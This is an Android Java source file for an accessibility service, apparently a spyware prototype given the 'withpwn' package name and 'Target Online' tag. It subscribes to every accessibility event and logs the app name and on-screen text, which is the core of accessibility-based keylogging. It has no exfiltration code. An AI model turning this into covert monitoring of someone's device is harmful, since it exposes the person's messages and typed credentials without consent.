package com.withpwn.ActivityLogger;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class AccessibilityService extends android.accessibilityservice.AccessibilityService {
    private static final String TAG = "Target Online";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //Log.e(TAG, "Catch Event : " + event.toString());
        Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
        Log.e(TAG, "Catch Event TEXT : " + event.getText());
        Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
        Log.e(TAG, "Catch Event getSource : " + event.getSource());
        Log.e(TAG, "=========================================================================");
    }

    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();

        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FEEDBACK_HAPTIC;
        info.notificationTimeout = 100;

        setServiceInfo(info);
    }

    @Override
    public void onInterrupt() {
        // TODO Auto-generated method stub
        Log.e("TEST", "OnInterrupt");
    }
}
